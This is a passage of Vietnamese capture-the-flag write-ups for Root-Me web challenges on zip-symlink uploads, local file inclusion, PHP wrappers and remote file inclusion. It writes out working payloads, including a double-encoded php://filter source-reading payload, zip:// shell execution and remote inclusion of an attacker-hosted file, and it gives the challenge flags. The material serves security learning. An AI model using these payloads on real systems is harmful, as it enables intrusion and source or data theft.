Tiếp theo ta symlink với file index.txt, ../../../ để đến được file index.php, nó nằm ở chỗ đó, còn vì sao thì phải thử lần lượt thôi

![image](https://user-images.githubusercontent.com/104350480/223041090-60bf88a8-e492-4d89-97c6-6c437c4c9494.png)

Sau đó ta thực hiện zip file lại là xong, ở đây cần chú ý thêm tùy chọn --symlinks vào nếu không khi zip lại thì ln -s đã tạo ở trên sẽ mất, hiểu đơn giản là 1 cái thì
là tạo liên kết mềm, còn 1 cái là bao gồm các liên kết mềm, không có nó thì các liên kết mềm được tạo ra sẽ bị hủy bỏ.

![image](https://user-images.githubusercontent.com/104350480/223041461-12a1d70b-a079-4082-8e6b-f4e9b5752a67.png)

Giờ up file đã zip lên trang ta được sau khi giải nén:

![image](https://user-images.githubusercontent.com/104350480/223042505-44899c58-4dae-4e93-af61-e06006ae713c.png)

Giờ nhấn vào index.txt là thực hiện được liên kết về file index.php để thực thi rồi: 

![image](https://user-images.githubusercontent.com/104350480/223042608-36531bb3-6cfb-4689-a9e0-3d129371d33f.png)


> Flag: N3v3r_7rU5T_u5Er_1npU7

### [Chall 5: File upload - Polyglot](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)<a name='rfu5'></a>

#### Are you bilingual?

```
Your friend who is a photography fan has created a site to allow people to share their beautiful photos. He assures you that his site is secure because he checks that the file sent is a JPEG, and that it is not a disguised PHP file. Prove him wrong

```
# Rootme - Local file inclusion <a name='rlfi'></a> 

## [1. Local file inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)<a name='rlfi1'></a>


Ở bài này ta có giao diện như sau:

![image](https://user-images.githubusercontent.com/104350480/223313079-ed47a20d-c5fd-497c-9933-9e65055a0bee.png)

Có vẻ trang web cho ta liệt kê ra một số file, dùng path traversal để lùi thư mục về 1 ô xem thế nào:

![image](https://user-images.githubusercontent.com/104350480/223313254-e1d7e6ba-f377-44d0-ad46-06c2eb18746e.png)

Mục tiêu của ta là truy cập file index.php nhưng mà phải của th admin, giờ quay về path bth mà mở 1 file bất kì, rồi lùi 2 lần là được: 

![image](https://user-images.githubusercontent.com/104350480/223313553-a35389a1-b185-427b-9495-f2179612d1c6.png)

Ta được mật khẩu của admin trong file luôn:

> Flag: OpbNJ60xYpvAQU8

## [2. Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)<a name='rlfi2'></a>

Đầu vào ta có giao diện thế này:

![image](https://user-images.githubusercontent.com/104350480/223316697-c0bb3d26-e3ce-4927-b966-ec9aa647248f.png)


Bài này thử path traversal bằng 1 vài phát thì kh được, như tên bài thì nó là double encoding ấy, thì khả năng là phải double encoding hết lên thì mới
bypass được, nhưng cũng kh bypass được gì. Thì ở đây là phải dùng 1 kĩ thuật để khai thác là php wrapper có dạng:
> php://filter/convert.base64-encode/resource=

Cách tấn công này sẽ mã hóa tệp tin dạng base64 và cố gắng đọc nội dung của tệp tin trên máy chủ. Nhưng mà bài này có dùng decode url hay sao ấy, filter
hết các dấu : // . - , nên ở đây ta encode url 2 lần là được:

> ?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource=cv

Ta được trả về kết quả: 

```
PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIENWPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8Pz0gJGNvbmZbJ2dsb2JhbF9zdHlsZSddID8+CiAgICA8bmF2PgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1ob21lIj5Ib21lPC9hPgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jdiIgY2xhc3M9ImFjdGl2ZSI+Q1Y8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICA8L25hdj4KICAgIDxoMT48Pz0gJGNvbmZbJ2NvbnRhY3QnXVsnZmlyc3RuYW1lJ10gPz4gPD89ICRjb25mWydjb250YWN0J11bJ2xhc3RuYW1lJ10gPz48L2gxPgogICAgPGgzPlByb2Zlc3Npb25hbCBkb2VyPC9oMz4KICAgIDw/PSAkY29uZlsnY3YnXVsnZ2VuZGVyJ10gPyAiTWFsZSIgOiAiRmVtYWxlIiA/Pjxicj4KICAgIDw/PSBkYXRlKCdZL20vZCcsICRjb25mWydjdiddWydiaXJ0aCddKSA/PiAoPD89IGRhdGUoJ1knKS1kYXRlKCdZJywgJGNvbmZbJ2N2J11bJ2JpcnRoJ10pID8+KQogICAgPD9waHAKICAgICAgZm9yZWFjaCAoJGNvbmZbJ2N2J11bJ2pvYnMnXSBhcyAkam9iKSB7CiAgICA/PgogICAgICA8ZGl2IGNsYXNzPSJqb2IiPgogICAgICAgIDxoND48Pz0gJGpvYlsndGl0bGUnXSA/PiAtIDxzcGFuIGNsYXNzPSJkYXRlIj48Pz0gJGpvYlsnZGF0ZSddID8+PC9zcGFuPjwvaDQ+CiAgICAgIDwvZGl2PgogICAgPD9waHAKICAgICAgfQogICAgPz4KICA8L2JvZHk+CjwvaHRtbD4K

```
Decode ngược lại ta được: 

```
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - CV</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home">Home</a>
      <a href="index.php?page=cv" class="active">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <h1><?= $conf['contact']['firstname'] ?> <?= $conf['contact']['lastname'] ?></h1>
    <h3>Professional doer</h3>
    <?= $conf['cv']['gender'] ? "Male" : "Female" ?><br>
    <?= date('Y/m/d', $conf['cv']['birth']) ?> (<?= date('Y')-date('Y', $conf['cv']['birth']) ?>)
    <?php
      foreach ($conf['cv']['jobs'] as $job) {
    ?>
      <div class="job">
        <h4><?= $job['title'] ?> - <span class="date"><?= $job['date'] ?></span></h4>
      </div>
    <?php
      }
    ?>
  </body>
</html>

```

Ta có thể thấy web server sẽ đọc và thực thi file nếu conf được truyền vào, vì mình thử thì nó tự dộng thêm .inc.php vào, oke thế thì tốt rồi: 

> ?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource=conf

Ta được thông điệp base64 trả về và decode thì được:

```
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    

```
> Flag: Th1sIsTh3Fl4g!

## [3. Local File Inclusion - Wrappers](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers)<a name='rlfi3'></a>

![image](https://user-images.githubusercontent.com/104350480/223317354-40fb805b-22e9-4710-9ab4-06df4a615b84.png)

Bài này cho ta upload file, nhưng mà filter sạch sành sang. Thì ý tưởng vẫn là phải upload file php, mà phải là đuôi jpg, vì vậy sau khi tìm hiểu được
thì ý tưởng ở đây là ta sẽ zip file lại dưới dạng jpg luôn, để sau khi được giải nén nó sẽ về cái file shell ban đầu:

![image](https://user-images.githubusercontent.com/104350480/223317983-8e0f2370-6209-4f49-b37e-45b37ed3fd7e.png)

Và upload thành công, check source ta được link tới đường dẫn: 

![image](https://user-images.githubusercontent.com/104350480/223318045-42c6f47a-43e7-4f60-ab5a-fde4b8b3688d.png)

Tiếp theo ta tìm đường dẫn đến file thông qua zip://tmp/upload/9AAWKLg8p.jpg và #2.php để chỉ ra vị trí tương đối trong đường dẫn tuyệt đối đang được xét
ở phía trước, nhưng bài này nó tự động thêm .php vào cuối rồi nên thử lại bỏ đi .php đi, mà có vẻ có lỗi: 

![image](https://user-images.githubusercontent.com/104350480/223319724-f79f692f-ed49-4f11-8a25-1910e8921d86.png)

Vậy là system không dùng được ở đây, thế thì ta sẽ sửa lại payload thực thi khác là được    

![image](https://user-images.githubusercontent.com/104350480/223320492-33326987-93d8-4b54-973a-c245aef74726.png)

Có source code trả về luôn: 

![image](https://user-images.githubusercontent.com/104350480/223320691-c3b60548-5829-40e2-95bb-04a35fc4d1b4.png)

Nhưng chả để làm gì. giờ làm thế nào mà kh dựa vào system để đọc đựa tập tin của nó hay thực thi lệnh để kiếm thì mới được, chứ mò thế này hơi khó.

Ở đây có thể áp dụng scandir hoặc hàm glob() trong php, áp dụng trả về mảng tên file hoặc thư mục directory hiện tại, sửa lại lệnh: 


![image](https://user-images.githubusercontent.com/104350480/223343066-908ba85d-7c5b-4abc-9845-d30abfc2fce4.png)

```
<?php
foreach (glob("*") as $filename) {
    echo $filename;
}
?>

```


Ta được file cần tìm : **flag-mipkBswUppqwXlq9ZydO.php**

![image](https://user-images.githubusercontent.com/104350480/223345270-0aaf6790-c5b1-4fb3-af28-bf1435e42f6e.png)


Giờ ta đọc file nữa là xong, sửa lại cnmd để in nội dung trong file flag là xong, vì kh thể dùng system nên ở đây ta dùng file_get_contents và được:

![image](https://user-images.githubusercontent.com/104350480/223345827-ac886ac3-4e8e-4973-9d90-b59b557a9724.png)

> Flag: lf1-Wr4pp3r_Ph4R_pwn3d

## [4. Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion#validation_challenge)<a name='rlfi4'></a>

```
Get the PHP source code.

```

![image](https://user-images.githubusercontent.com/104350480/223347554-71d3359e-c1c1-4c07-ace3-5da37b498249.png)

Bài này ta thấy 2 cái là fr và en được truyền vào thì sẽ hiện ra trang tương ứng, ta có thể hình dung được nó đã được nối chuỗi gì đó vào rồi, thử
paht traversal thì ta nhận được lỗi luôn: 

![image](https://user-images.githubusercontent.com/104350480/223375409-1cf4eef2-e2df-4d16-a9ff-9b323694aaa4.png)

Ta có thể thấy nó được nối thêm đuôi và _lang.php, thì để bỏ đuôi này đơn giản ta chỉ cần thêm null byte vào sau thôi, hoặc ? cũng được.
Vì bài này có liên quan đến rce nên ta có thể test trước, thì trước tiên ta thử 1 link bất kì như ở đây là youtube xem sao:

> ?lang=https://www.youtube.com/watch?v=FzVR_fymZw4&list=RDFzVR_fymZw4&start_radio=1%00

![image](https://user-images.githubusercontent.com/104350480/223376034-2fb89a6f-07f7-4260-90f3-efc2cf032e68.png)
 
 Được luôn này, vậy thì ta đã thực thi được include thành công, vậy triển khai tiếp thôi.
 Được rồi giờ ta thực hiện rce thôi, kiểu bài này cũng hơi lạ, ta phải đi thử xem file đấy là gì, mình thực hiện system thì bị lỗi rồi nên ta thử file_get_contents một file bất kì xem. Ở đây mình sẽ đoán 1 vài file thông dụng như index.php chả hạn.
 Ta dụng ngrok rồi post file lên, nhưng khi thực hiện truyền đường dẫn thì thêm ? ở cuối vào, mình thêm null byte bị lỗi, thì bởi cái server của mình get 
 3.php%00_lang.php ở server mình đâu có được đâu.
 
 ![image](https://user-images.githubusercontent.com/104350480/223378633-74e40f4d-2681-49b4-a370-95c8b70fe283.png)

Ta thực hiện thành công: 
 
 ![image](https://user-images.githubusercontent.com/104350480/223378524-31a0acac-87bb-4932-a312-91ee02c6edca.png)

Ta có được source code và cả flag luôn:

![image](https://user-images.githubusercontent.com/104350480/223379082-85fe07a1-e00f-49ac-9b10-48d4ad94bb62.png)

 
> Flag: R3m0t3_iS_r3aL1y_3v1l



